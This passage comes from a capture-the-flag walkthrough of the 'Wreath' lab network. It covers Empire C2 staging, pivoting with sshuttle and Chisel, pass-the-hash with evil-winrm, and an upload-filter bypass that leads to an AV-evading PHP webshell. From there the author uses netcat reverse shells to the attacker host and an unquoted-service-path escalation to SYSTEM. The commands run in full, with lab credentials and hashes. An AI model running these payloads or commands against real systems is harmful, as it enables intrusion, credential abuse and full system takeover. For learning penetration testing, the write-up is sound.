[INFO]: Empire Compiler: fetching and unarchiving <https://github.com/BC-SECURITY/Empire-Compiler/releases/download/v0.4.3/EmpireCompiler-linux-x64-v0.4.3.tgz>
```
When running the Empire server, a problem occurred where it froze during the Empire Compiler download process.
This is because Empire version 6.4.1 tries to automatically download Empire Compiler, but this can fail depending on the network environment.
To resolve this, we bypassed the Empire Compiler initialization step by manually creating the required directories and files.

**Command:**
```bash
sudo mkdir -p "/root/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v0.4.3/EmpireCompiler/Data/Temp"
# Manually create Empire Compiler directory

sudo touch "/root/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v0.4.3/EmpireCompiler/Data/Temp/empire.crproj"
# Manually create Empire Compiler configuration file

sudo powershell-empire server
# Restart Empire server
```
**Result:**
```bash
[INFO]: Empire starting up...
[INFO]: v2: Loading listener templates from: /usr/share/powershell-empire/empire/server/listeners
[INFO]: v2: Loading stager templates from: /usr/share/powershell-empire/empire/server/stagers
[INFO]: v2: Loading bypasses from: /usr/share/powershell-empire/empire/server/bypasses
[INFO]: v2: Loading malleable profiles from: /usr/share/powershell-empire/empire/server/data/profiles
[INFO]: v2: Loading modules from: /usr/share/powershell-empire/empire/server/modules
[INFO]: Searching for plugins at /usr/share/powershell-empire/empire/server/plugins
[INFO]: Initializing plugin: Basic Reporting
[INFO]: Starkiller enabled. Loading.
[INFO]: Starkiller served at <http://localhost:1337/>
[INFO]: Application startup complete.
[INFO]: Uvicorn running on <http://0.0.0.0:1337> (Press CTRL+C to quit)
```
Empire server started successfully.
Since Empire version 6.4.1 in use does not support CLI client commands, we proceeded through the Starkiller web UI built into the Empire server.
Starkiller is the GUI interface of Empire and can be used by accessing http://localhost:1337 in the browser (empireadmin:password123).
Next, let's run sshuttle to create a tunnel to access the internal network.

**Command:**
```bash
sshuttle --disable-ipv6 -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa.txt" 10.200.180.0/24 -x 10.200.180.200
# --disable-ipv6 → Prevent IPv6 binding error
# -r             → Specify relay server
# --ssh-cmd      → Specify SSH key file
# -x             → Exclude web server (Broken Pipe prevention)
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ sshuttle --disable-ipv6 -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa.txt" 10.200.180.0/24 -x 10.200.180.200
[local sudo] Password:
c : Connected to server.
```
Next, let's create listeners in Starkiller.
Two listeners need to be created.
First, create an HTTP listener to receive agent connections on the attacking machine, and then create an http_hop listener to relay traffic from the Git server.

**Webserver Listener Settings:**
```bash
Type  : http
Name  : Webserver
Host  : http://<attacker IP>
Port  : 9000
```
**http_hop Listener Settings:**
```bash
Type             : http_hop
Name             : http_hop
Host             : <http://10.200.180.200>
Port             : 47002
RedirectListener : Webserver
```
**Result:**

(image)

Listener creation was successful.
When the http_hop listener is created, hop files are automatically generated in the /tmp/http_hop/ directory.

**Example:**
```bash
[INFO]: Hop redirector written to /tmp/http_hop//admin/get.php
[INFO]: Hop redirector written to /tmp/http_hop//news.php
[INFO]: Hop redirector written to /tmp/http_hop//login/process.php
[INFO]: Listener "http_hop" successfully started
```
Next, let's create stagers.
Since the Git server is a Windows machine, we created a PowerShell stager, and also created a Python stager for the prod-serv (Linux) agent.

**Python Stager Settings (for prod-serv):**
```bash
Type      : multi_launcher
Listener  : http_hop
Language  : python
```
**PowerShell Stager Settings (for Git server):**
```bash
Type      : multi_launcher
Listener  : http_hop
Language  : powershell
```
**Result:**

(image)

Stager creation was successful.
After creating the stager, click Actions → Copy to Clipboard to copy the payload.
Next, let's transfer the generated hop files to the web server (10.200.180.200).

**Command (Local root shell):**
```bash
cd /tmp/http_hop && zip -r hop.zip *
# Create hop.zip inside /tmp/http_hop

python3 -m http.server 8888
# Run web server in current directory (/tmp/http_hop)
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[/tmp/http_hop]
└─$ cd /tmp/http_hop && zip -r /tmp/hop.zip *
  adding: admin/ (stored 0%)
  adding: admin/get.php (deflated 67%)
  adding: login/ (stored 0%)
  adding: login/process.php (deflated 67%)
  adding: news.php (deflated 67%)

┌──(jaejun835㉿jaejun835)-[/tmp]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (<http://0.0.0.0:8888/>) ...
```
**Command (Target SSH shell):**
```bash
mkdir -p /tmp/hop-jaejun835 && cd /tmp/hop-jaejun835
# Create directory and navigate

curl <http://10.250.180.9:8888/hop.zip> -o hop.zip
# Download file

unzip -o hop.zip
# Extract archive

firewall-cmd --zone=public --add-port 47002/tcp
# Open firewall port

php -S 0.0.0.0:47002 -t /tmp/hop-jaejun835/
# Run PHP web server
# -S → Specify server address:port
# -t → Specify server root directory
```
**Result:**
```bash
[root@prod-serv hop-jaejun835]# mkdir -p /tmp/hop-jaejun835 && cd /tmp/hop-jaejun835
[root@prod-serv hop-jaejun835]# curl <http://10.250.180.9:8888/hop.zip> -o hop.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
100  2961  100  2961    0     0   6354      0 --:--:-- --:--:-- --:--:--  6340
[root@prod-serv hop-jaejun835]# unzip -o hop.zip
Archive:  hop.zip
  inflating: admin/get.php
  inflating: login/process.php
  inflating: news.php
[root@prod-serv hop-jaejun835]# ls
admin  hop.zip  login  news.php
[root@prod-serv hop-jaejun835]# firewall-cmd --zone=public --add-port 47002/tcp
success
[root@prod-serv hop-jaejun835]# php -S 0.0.0.0:47002 -t /tmp/hop-jaejun835/
PHP 7.2.24 Development Server started at Thu Mar 26 07:48:57 2026
Listening on <http://0.0.0.0:47002>
Document root is /tmp/hop-jaejun835
Press Ctrl-C to quit
```
PHP web server started successfully.
The reason we run the PHP web server in the foreground is that the -t option must explicitly specify the hop file directory for it to serve properly.
Now let's run the Python stager on prod-serv to connect the prod-serv agent.
Running the Python stager directly in another SSH shell will connect prod-serv to Empire.

**Command (Target shell - prod-serv):**
```bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('<payload>'));" | python3 &
# Run Python stager
```
**Result:**
```bash
[INFO]: Webserver: Sending PYTHON stager (stage 1) to 10.200.180.200
[INFO]: New agent 64MP6G24 checked in
[INFO]: Initial agent 64MP6G24 from 10.200.180.200 now active
[INFO]: Webserver: Sending agent (stage 2) to 64MP6G24 at 10.200.180.200
```
prod-serv agent connection was successful.
Next, let's run the PowerShell stager through the webshell on the Git server to obtain the Git server agent.
When sending the stager through the webshell, the --data-urlencode option is used to automatically apply URL encoding.

**Command (Local shell):**
```bash
curl -X POST <http://10.200.180.150/web/exploit-jaejun835.php> --data-urlencode "a=powershell -noP -sta -w 1 -enc <payload>"
# --data-urlencode → Automatically apply URL encoding to payload containing special characters
```
**Result:**
```bash
[INFO]: Webserver: Sending POWERSHELL stager (stage 1) to 10.200.180.200
[INFO]: Agent CZIIYJLX from 10.200.180.200 posted public key
[INFO]: New agent CZIIYJLX checked in
[INFO]: Initial agent CZIIYJLX from 10.200.180.200 now active
[INFO]: Webserver: Sending agent (stage 2) to CZIIYJLX at 10.200.180.200
```
Git server agent connection was successful.
The reason the IP is displayed as 10.200.180.200 is that due to the http_hop structure, the Git server's traffic is relayed through the web server (10.200.180.200).

### \[ Task 33 - Enumeration (Personal PC) \]
The goal of Task 33 is to use Empire modules to scan open ports on Machine 3 (10.200.180.100) and select the next attack target.
Since the Git server is a Windows machine, nmap cannot be used directly.
Instead, we performed a port scan by including Empire's Invoke-Portscan script in evil-winrm.

**Command:**
```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
# -u → Username
# -H → Connect with NTLM hash (Pass-the-Hash)
# -i → Target IP
# -s → Specify PowerShell script directory
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```
evil-winrm connection was successful.
Next, let's initialize the Invoke-Portscan script and run the port scan.

**Command:**
```bash
Invoke-Portscan.ps1
# Initialize script

Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 150
# Scan top 150 ports
# -Hosts    → Specify hosts to scan
# -TopPorts → Scan top N ports
```
**Result:**
```bash
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Invoke-Portscan.ps1
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 150

Hostname      : 10.200.180.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 111, 1723...}
finishTime    : 3/26/2026 8:05:12 AM
```
As a result of the port scan, we confirmed that ports 80 (HTTP) and 3389 (RDP) are open on 10.200.180.100.
Through port 3389 (RDP), we confirmed that the host is a Windows machine, and identified that the web service on port 80 is the next attack target.

**Answer:**
```bash
Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
#80,3389
```
### \[ Task 34 - Pivoting (Personal PC) \]
The goal of Task 34 is to use Chisel to pivot to and access the web service on Machine 3 (10.200.180.100) and verify the server language.
Since Machine 3 only exists in the internal network, we will configure a Chisel forward proxy through the Git server (.150) to access it.
First, download the Chisel Windows binary and upload it to the Git server via evil-winrm.

**Command (Local shell):**
```bash
wget <https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz>
# Download Chisel Windows binary

gunzip chisel_1.7.7_windows_amd64.gz
# Extract archive

mv chisel_1.7.7_windows_amd64 chisel-jaejun835.exe
# Rename file
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ wget <https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz>
...
2026-03-27 14:11:55 (611 KB/s) - 'chisel_1.7.7_windows_amd64.gz' saved [3252015/3252015]

┌──(jaejun835㉿jaejun835)-[~]
└─$ gunzip chisel_1.7.7_windows_amd64.gz

┌──(jaejun835㉿jaejun835)-[~]
└─$ mv chisel_1.7.7_windows_amd64 chisel-jaejun835.exe

┌──(jaejun835㉿jaejun835)-[~]
└─$ ls -la chisel-jaejun835.exe
-rw-rw-r-- 1 jaejun835 jaejun835 8230912 Jan 31  2022 chisel-jaejun835.exe
```
Next, let's upload the Chisel binary to the Git server via evil-winrm.

**Command (evil-winrm):**
```bash
upload /home/jaejun835/chisel-jaejun835.exe
# Upload Chisel binary
```
**Result:**
```bash
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> upload /home/jaejun835/chisel-jaejun835.exe

Info: Uploading /home/jaejun835/chisel-jaejun835.exe to C:\\Users\\Administrator\\Documents\\chisel-jaejun835.exe

Data: 10974548 bytes of 10974548 bytes copied

Info: Upload successful!
```
Next, open the firewall port and run the Chisel server.

**Command (evil-winrm):**
```bash
netsh advfirewall firewall add rule name="Chisel-jaejun835" dir=in action=allow protocol=tcp localport=47000
# Open firewall port

.\\chisel-jaejun835.exe server -p 47000 --socks5
# Run Chisel server
```
**Result:**
```bash
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> netsh advfirewall firewall add rule name="Chisel-jaejun835" dir=in action=allow protocol=tcp localport=47000
Ok.
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> .\\chisel-jaejun835.exe server -p 47000 --socks5
2026/03/27 06:24:46 server: Fingerprint qYr4SLYXR/aui9NXTqSDXgcMhnydhNMjLegg+cPNiIQ=
2026/03/27 06:24:46 server: Listening on <http://0.0.0.0:47000>
```
Next, run the Chisel client locally to configure the SOCKS5 proxy.

**Command (Local shell):**
```bash
./chisel client 10.200.180.150:47000 9090:socks
# Run Chisel client
# Configure SOCKS5 proxy on local port 9090
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ ./chisel client 10.200.180.150:47000 9090:socks
2026/03/27 14:25:22 client: Connecting to ws://10.200.180.150:47000
2026/03/27 14:25:22 client: tun: proxy#127.0.0.1:9090=>socks: Listening
2026/03/27 14:25:25 client: Connected (Latency 430.069563ms)
```
Chisel connection was successful.
Now let's modify the proxychains configuration to use the Chisel SOCKS5 proxy.

**Command:**
```bash
sudo nano /etc/proxychains4.conf
# Modify proxychains configuration file
# Comment out: socks4 127.0.0.1 9050
# Add: socks5 127.0.0.1 9090
```
After completing the configuration, we used curl to access the Machine 3 web service and verified the server language.

**Command:**
```bash
curl --socks5 127.0.0.1:9090 -I <http://10.200.180.100>
# -I → Output headers only
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl --socks5 127.0.0.1:9090 -I <http://10.200.180.100>
HTTP/1.1 200 OK
Date: Fri, 27 Mar 2026 06:45:24GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
Last-Modified: Sun, 08 Nov 2020 15:46:48GMT
ETag: "3dc7-5b39a5a80eecc"
Accept-Ranges: bytes
Content-Length: 15815
Content-Type: text/html
```
We confirmed PHP/7.4.11 in the server header.

**Answer:**
```bash
Using the Wappalyzer browser extension or an alternative method, identify the server-side Programming language (including the version number) used on the website.
#PHP7.4.11
```
### \[ Task 35 - The Wonders of Git (Personal PC) \]
The goal of Task 35 is to download and analyze the source code repository from the Git server locally.
Taking advantage of the fact that Thomas manages versions through the Git server, we will download the Website.git directory via evil-winrm and then restore the commit history using GitTools.
First, let's check the path of the Website.git directory on the Git server.

**Command:**
```bash
cmd /c "dir /s /b C:\\ | findstr Website.git"
# Search for Website.git directory path
```
**Result:**
```bash
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cmd /c "dir /s /b C:\\ | findstr Website.git"
C:\\GitStack\\repositories\\Website.git
...
```
**Command:**
```bash
cd C:\\GitStack\\repositories
download Website.git
```
**Result:**
```bash
*Evil-WinRM* PS C:\\GitStack\\repositories> download Website.git

Info: Downloading C:\\GitStack\\repositories\\Website.git to Website.git

Info: Download successful!
```
After download is complete, let's restore commits using GitTools locally.

**Command (Local shell):**
```bash
mkdir ~/Wreath-Website
# Create working directory

mv ~/Website.git ~/Wreath-Website/.git
# Rename to .git directory

cd ~/Wreath-Website
git clone <https://github.com/internetwache/GitTools>
# Clone GitTools

GitTools/Extractor/extractor.sh . Website
# Extract commits
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~/Wreath-Website]
└─$ GitTools/Extractor/extractor.sh . Website
[+] Found commit: 70dde80cc19ec76704567996738894828f4ee895
[+] Found commit: 345ac8b236064b431fa43f53d91c98c4834ef8f3
[+] Found commit: 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
```
Next, let's check the commit order.

**Command:**
```bash
cd Website
separator="======================================="; for i in $(ls); do printf "\\n\\n$separator\\n\\033[4;1m$i\\033[0m\\n$(cat $i/commit-meta.txt)\\n"; done; printf "\\n\\n$separator\\n\\n\\n"
```
**Result:**
```bash
=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000
Static Website Commit

=======================================
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000
Updated the filter

=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000
Initial Commit for the back-end
```
As a result of tracking parent values to confirm the commit order, the result is as follows.
1. 70dde80... → Static Website Commit (initial static site)
2. 82dfc97... → Initial Commit for the back-end (backend added)
3. 345ac8b... → Updated the filter (filter update) ← latest version

**Answer:**
```bash
What is the absolute path to the Website.git directory?
#C:\\GitStack\\repositories\\Website.git
```
### \[ Task 36 - Website Code Analysis (Personal PC) \]
The goal of Task 36 is to analyze the PHP source code from the latest commit restored from the Git repository to find vulnerabilities.
Let's search for PHP files in the latest commit directory.

**Command:**
```bash
cd 1-345ac8b236064b431fa43f53d91c98c4834ef8f3
find . -name "*.php"
# Search for PHP files
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~/Wreath-Website/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3]
└─$ find . -name "*.php"
./resources/index.php
```
**Command:**
```bash
cat resources/index.php
```
**Result:**
```php
<?php
        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }
...
        <!-- ToDo:
                  - Finish the styling: it looks awful
                  - Get Ruby more food. Greedy animal is going through it too fast
                  - Upgrade the filter on this page. Can't rely on basic auth for everything
                  - Phone Mrs Walker about the neighbourhood watch meetings
        -->
```
As a result of source code analysis, we confirmed that two filters are applied.
The first filter is the method explode(".", $_FILES["file"]["name"])[1] which only checks the second element of the filename.
For example, if shell.jpg.php is uploaded, explode returns ["shell", "jpg", "php"] and [1] retrieves jpg, allowing it to pass the filter.
The second filter is getimagesize() which checks whether it is an actual image.
This can be bypassed by inserting a PHP payload into an image using exiftool.
Also, from the ToDo comment, we confirmed that the page is only protected by Basic Auth.

**Answer:**
```bash
What does Thomas have to phone Mrs Walker about?
#neighbourhood watch meetings

Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
#Basic Auth

Which extensions are accepted (comma separated, no spaces or quotes)?
#jpg,jpeg,png,gif
```
### \[ Task 37 - Exploit PoC (Personal PC) \]
The goal of Task 37 is to use the analyzed vulnerabilities to bypass the file upload filter and perform a PHP webshell upload PoC.
The Basic Auth credentials used were Thomas's password obtained with Mimikatz in Task 21.
First, download a test image and insert a PHP payload using exiftool.

**Command:**
```bash
wget <https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Cat03.jpg/1200px-Cat03.jpg> -O test-jaejun835.jpeg.php
# Download test image

exiftool -Comment="Test Payload\\"; die(); ?>" test-jaejun835.jpeg.php
# Insert PHP payload with exiftool
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ wget <https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Cat03.jpg/1200px-Cat03.jpg> -O test-jaejun835.jpeg.php
...
2026-03-27 18:47:18 (1.88 MB/s) - 'test-jaejun835.jpeg.php' saved [215264/215264]

┌──(jaejun835㉿jaejun835)-[~]
└─$ exiftool -Comment="Test Payload\\"; die(); ?>" test-jaejun835.jpeg.php
    1 image files updated
```
Next, let's upload the file with curl and verify execution.

**Command:**
```bash
curl --socks5 127.0.0.1:9090 <http://10.200.180.100/resources/> -u 'thomas:i<3ruby' -F "file=@test-jaejun835.jpeg.php" -F "upload=upload"
# Upload file

curl --socks5 127.0.0.1:9090 <http://10.200.180.100/resources/uploads/test-jaejun835.jpeg.php> -u 'thomas:i<3ruby' --output -
# Verify uploaded file execution
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl --socks5 127.0.0.1:9090 <http://10.200.180.100/resources/uploads/test-jaejun835.jpeg.php> -u 'thomas:i<3ruby' --output -
����<pre>Test Payload</pre>
```
We confirmed that the PHP code executed successfully.
We successfully bypassed both filters, confirming that actual webshell upload is possible.

### \[ Task 38~39 - AV Evasion Introduction & Detection Methods \]
In Tasks 38~39, we studied the concepts of AV evasion and detection methods.
AV evasion has two methods: On-Disk evasion and In-Memory evasion.
Detection methods are classified as Static Detection (signature-based) and Dynamic/Heuristic/Behavioural Detection.
Since we need to carry out attacks in an environment where Windows Defender is active, payload obfuscation is required.

**Task 38 Answer:**
```bash
Which category of evasion covers uploading a file to the storage on the target before executing it?
#On-Disk evasion

What does AMSI stand for?
#Anti-Malware Scan Interface

Which category of evasion does AMSI affect?
#In-Memory evasion
```
**Task 39 Answer:**
```bash
What other name can be used for Dynamic/Heuristic detection methods?
#Behavioural

If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
#Static

When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
#Pre-defined rules

What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
#Password
```
### \[ Task 40 - PHP Payload Obfuscation (AV Evasion) \]
The goal of Task 40 is to obfuscate the PHP webshell payload to bypass Windows Defender and upload it.
First, write the basic PHP webshell payload.
```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```
As a result of obfuscating the payload using an online PHP obfuscation tool, the result is as follows.
```php
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```
When passing via bash commands, escaping is needed to prevent dollar signs from being interpreted as bash variables.

**Command:**
```bash
cp test-jaejun835.jpeg.php shell-jaejun835.jpeg.php
# Copy image

exiftool -Comment="<?php \\$p0=\\$_GET[base64_decode('d3JlYXRo')];if(isset(\\$p0)){echo base64_decode('PHByZT4=').shell_exec(\\$p0).base64_decode('PC9wcmU+');}die();?>" shell-jaejun835.jpeg.php
# Insert obfuscated webshell payload

curl --socks5 127.0.0.1:9090 <http://10.200.180.100/resources/> -u 'thomas:i<3ruby' -F "file=@shell-jaejun835.jpeg.php" -F "upload=upload"
# Upload webshell

curl --socks5 127.0.0.1:9090 "<http://10.200.180.100/resources/uploads/shell-jaejun835.jpeg.php?wreath=whoami>" -u 'thomas:i<3ruby' --output -
# Verify webshell execution
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ curl --socks5 127.0.0.1:9090 "<http://10.200.180.100/resources/uploads/shell-jaejun835.jpeg.php?wreath=whoami>" -u 'thomas:i<3ruby' --output -
����<pre>wreath-pc\\thomas
</pre>
```
We confirmed that the webshell executed successfully.

**Answer:**
```bash
What is the Host Name of the target?
#WREATH-PC

What is our current username (include the domain in this)?
#wreath-pc\\thomas
```
### \[ Task 41 - Compiling Netcat & Reverse Shell (AV Evasion) \]
The goal of Task 41 is to upload netcat to obtain a full reverse shell.
To use a netcat binary that is not detected by Windows Defender, we downloaded a separate version from GitHub.

**Command (Local shell):**
```bash
git clone <https://github.com/int0x33/nc.exe/>
# Clone netcat repository

sudo python3 -m http.server 80
# Run web server for file transfer
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ git clone <https://github.com/int0x33/nc.exe/>
Cloning into 'nc.exe'...
remote: Enumerating objects: 13, done.
...
Receiving objects: 100% (13/13), 114.07 KiB | 512.00 KiB/s, done.
```
Next, download nc64.exe to the target using the webshell.

**Command:**
```bash
curl --socks5 127.0.0.1:9090 "<http://10.200.180.100/resources/uploads/shell-jaejun835.jpeg.php?wreath=curl%20http://10.250.180.9/nc.exe/nc64.exe%20-o%20c:\\\\windows\\\\temp\\\\nc-jaejun835.exe>" -u 'thomas:i<3ruby' --output -
# Download nc64.exe through webshell
```
**Result:**
```bash
10.200.180.100 - - [27/Mar/2026 18:54:45] "GET /nc.exe/nc64.exe HTTP/1.1" 200 -
```
Next, run the nc listener and execute the reverse shell through the webshell.

**Command:**
```bash
nc -lvnp 4444
# Run nc listener locally
curl --socks5 127.0.0.1:9090 "<http://10.200.180.100/resources/uploads/shell-jaejun835.jpeg.php?wreath=powershell.exe%20c:\\\\windows\\\\temp\\\\nc-jaejun835.exe%2010.250.180.9%204444%20-e%20cmd.exe>" -u 'thomas:i<3ruby' --output -
# Execute reverse shell through webshell
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.250.180.9] from (UNKNOWN) [10.200.180.100] 50040
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\\xampp\\htdocs\\resources\\uploads>
```
Reverse shell acquisition was successful.

**Answer:**
```bash
CertUtil: -dump command completed successfully.
```
### \[ Task 42 - Enumeration (AV Evasion) \]
The goal of Task 42 is to search for privilege escalation vectors in the obtained reverse shell.

**Command:**
```bash
whoami /priv
# Check current user privileges
```
**Result:**
```bash
C:\\xampp\\htdocs\\resources\\uploads>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
We confirmed that SeImpersonatePrivilege is enabled.
This is the privilege used in PrintSpoofer and Potato series privilege escalation exploits.
Next, let's search for vulnerable services.

**Command:**
```bash
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\\Windows"
# Check list of non-default services
```
**Result:**
```bash
C:\\xampp\\htdocs\\resources\\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\\Windows"
DisplayName                      Name                       PathName                                                                                    StartMode
...
System Explorer Service          SystemExplorerHelpService  C:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe  Auto
...
```
We confirmed that the SystemExplorerHelpService service path has no quotes, indicating an Unquoted Service Path vulnerability.

**Command:**
```bash
sc qc SystemExplorerHelpService
# Check service execution account
```
**Result:**
```bash
C:\\xampp\\htdocs\\resources\\uploads>sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
We confirmed that the service is running under the LocalSystem account.

**Command:**
```bash
powershell "get-acl -Path 'C:\\Program Files (x86)\\System Explorer' | format-list"
# Check directory permissions
```
**Result:**
```bash
Path   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files (x86)\\System Explorer
Owner  : BUILTIN\\Administrators
Access : BUILTIN\\Users Allow  FullControl
```
We confirmed that the BUILTIN\\Users group has FullControl permission, allowing files to be written to that directory.

**Answer:**
```bash
[Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
#SeImpersonatePrivilege

What is the Name of the vulnerable service?
#SystemExplorerHelpService

Is the service running as the local system account (Aye/Nay)?
#Aye
```
### \[ Task 43 - Privilege Escalation (AV Evasion) \]
The goal of Task 43 is to use the Unquoted Service Path vulnerability to obtain SYSTEM privileges.
First, write a wrapper program that runs netcat using the Mono compiler and compile it.

**Command:**
```bash
cat > Wrapper.cs << 'EOF'
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\\\windows\\\\temp\\\\nc-jaejun835.exe", "10.250.180.9 5555 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
EOF
# Write Wrapper.cs

mcs Wrapper.cs
# Compile with Mono compiler
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ mcs Wrapper.cs

┌──(jaejun835㉿jaejun835)-[~]
└─$
```
Next, upload Wrapper.exe to the target through the webshell.

**Command:**
```bash
curl --socks5 127.0.0.1:9090 "<http://10.200.180.100/resources/uploads/shell-jaejun835.jpeg.php?wreath=curl%20http://10.250.180.9/Wrapper.exe%20-o%20%25TEMP%25\\\\wrapper-jaejun835.exe>" -u 'thomas:i<3ruby' --output -
# Upload Wrapper.exe through webshell
```
Next, place Wrapper.exe using the Unquoted Service Path vulnerability.

**Command (from reverse shell):**
```bash
dir "C:\\Program Files (x86)\\System Explorer\\"
# Check whether existing System.exe exists

copy %TEMP%\\wrapper-jaejun835.exe "C:\\Program Files (x86)\\System Explorer\\System.exe"
# Copy Wrapper.exe as System.exe

sc stop SystemExplorerHelpService
# Stop service

sc start SystemExplorerHelpService
# Start service (execute Wrapper.exe)
```
**Result:**
```bash
C:\\xampp\\htdocs\\resources\\uploads>copy %TEMP%\\wrapper-jaejun835.exe "C:\\Program Files (x86)\\System Explorer\\System.exe"
        1 file(s) copied.

C:\\xampp\\htdocs\\resources\\uploads>sc stop SystemExplorerHelpService
...
C:\\xampp\\htdocs\\resources\\uploads>sc start SystemExplorerHelpService
```
A shell with SYSTEM privileges connected to the local listener.

**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.250.180.9] from (UNKNOWN) [10.200.180.100] 50087
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
